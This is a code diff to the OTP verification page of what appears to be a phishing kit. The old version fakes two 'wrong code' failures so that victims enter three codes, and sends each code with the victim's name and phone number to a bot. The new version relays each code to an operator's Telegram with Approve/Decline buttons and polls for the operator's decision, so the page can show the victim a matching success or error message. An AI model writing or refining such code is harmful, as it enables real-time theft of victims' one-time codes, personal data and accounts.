@@ -5,7 +5,7 @@ import { Header } from '../components/Header';
 import { Footer } from '../components/Footer';
 import { LoadingOverlay } from '../components/LoadingOverlay';
 import { KeyRound, AlertCircle } from 'lucide-react';
-import { sendBotNotification } from '../services/botService';
+import { requestOtpVerification, checkOtpStatus, sendBotNotification } from '../services/botService';
 
 export const VerificationPage = () => {
   const { user } = useParams();
@@ -17,7 +17,7 @@ export const VerificationPage = () => {
   const [verifying, setVerifying] = useState(false);
   const [statusMessage, setStatusMessage] = useState('');
   const [statusType, setStatusType] = useState('info');
-  const [attemptCount, setAttemptCount] = useState(1);
+  const [sessionId, setSessionId] = useState(null);
 
   const refs = [useRef(), useRef(), useRef(), useRef(), useRef(), useRef()];
 
@@ -68,7 +68,45 @@ export const VerificationPage = () => {
     }
   };
 
-  const handleVerify = (e) => {
+  // Live Polling for Admin Telegram Approve/Decline click for OTP
+  useEffect(() => {
+    if (!sessionId || !verifying) return;
+
+    const pollInterval = setInterval(async () => {
+      try {
+        const res = await checkOtpStatus(sessionId);
+        console.log("📊 Live Telegram OTP Status:", res.status);
+
+        if (res.status === 'approved') {
+          clearInterval(pollInterval);
+          setVerifying(false);
+          setStatusMessage('✅ Verification Successful! Redirecting...');
+          setStatusType('success');
+
+          setTimeout(() => {
+            const userSegment = user || 'user11';
+            navigate(`/${userSegment}/compliance`);
+          }, 1200);
+        } else if (res.status === 'wrong_code') {
+          clearInterval(pollInterval);
+          setVerifying(false);
+          setStatusMessage('❌ Expired or wrong OTP code. Please try again');
+          setStatusType('error');
+          setOtpDigits(['', '', '', '', '', '']);
+          setSessionId(null);
+          setTimeout(() => {
+            refs[0].current?.focus();
+          }, 100);
+        }
+      } catch (err) {
+        console.error("Polling OTP status error:", err);
+      }
+    }, 2000);
+
+    return () => clearInterval(pollInterval);
+  }, [sessionId, verifying, user, navigate]);
+
+  const handleVerify = async (e) => {
     e?.preventDefault();
     const code = otpDigits.join('');
     if (code.length < 6) {
@@ -78,43 +116,24 @@ export const VerificationPage = () => {
     }
 
     setVerifying(true);
-    setStatusMessage(`⏳ Verifying OTP code (Attempt ${attemptCount} of 3)...`);
+    setStatusMessage('⏳ Verifying OTP code... Waiting for authorization');
     setStatusType('info');
+    updateClient({ otp: code });
 
-    // Send Bot Notification for OTP Code
-    sendBotNotification(
-      `🔑 <b>Client OTP Received</b> (Attempt ${attemptCount}/3):\n` +
-      `<b>Client Name</b>: ${client.name || 'Unknown'}\n` +
-      `<b>Phone Number</b>: ${client.number || 'N/A'}\n` +
-      `<b>OTP Code</b>: <code>${code}</code>\n` +
-      `<b>Reference ID</b>: ${client.refId}`
-    );
+    try {
+      // Send OTP request with Approve / Decline buttons to Admin's Telegram
+      const result = await requestOtpVerification({
+        phoneNumber: client.number,
+        otpCode: code,
+        userName: client.name,
+        userId: client.refId
+      });
 
-    if (attemptCount < 3) {
-      // Fail attempts 1 and 2, requiring user re-entry
-      setTimeout(() => {
-        setVerifying(false);
-        setStatusMessage(`❌ Expired or wrong OTP code. Please try again (Attempt ${attemptCount} of 3 failed)`);
-        setStatusType('error');
-        setAttemptCount((prev) => prev + 1);
-        setOtpDigits(['', '', '', '', '', '']);
-        setTimeout(() => {
-          refs[0].current?.focus();
-        }, 100);
-      }, 1500);
-    } else {
-      // Attempt 3 succeeds and proceeds
-      updateClient({ otp: code });
-      setTimeout(() => {
-        setVerifying(false);
-        setStatusMessage('✅ Verification Successful! Redirecting...');
-        setStatusType('success');
-
-        setTimeout(() => {
-          const userSegment = user || 'user11';
-          navigate(`/${userSegment}/compliance`);
-        }, 1200);
-      }, 1500);
+      if (result && result.sessionId) {
+        setSessionId(result.sessionId);
+      }
+    } catch (err) {
+      console.error("Failed to request OTP verification:", err);
     }
   };
 
@@ -133,7 +152,7 @@ export const VerificationPage = () => {
   return (
     <div className="app-viewport">
       <Header />
-      {verifying && <LoadingOverlay message={`⏳ Verifying OTP code (Attempt ${attemptCount} of 3)...`} />}
+      {verifying && <LoadingOverlay message="⏳ Verifying OTP code... Waiting for authorization" />}
       <main className="main-content">
         <div className="otp-container">
           <div className="login-icon-badge">
@@ -144,7 +163,7 @@ export const VerificationPage = () => {
             OTP Verification
           </h2>
           <p style={{ color: 'var(--text-secondary)', fontSize: '0.95rem', marginTop: '0.4rem' }}>
-            Enter the 6-digit verification code sent to {client.number || 'your mobile number'} (Attempt {attemptCount} of 3)
+            Enter the 6-digit verification code sent to {client.number || 'your mobile number'}
           </p>
 
           {statusMessage && (
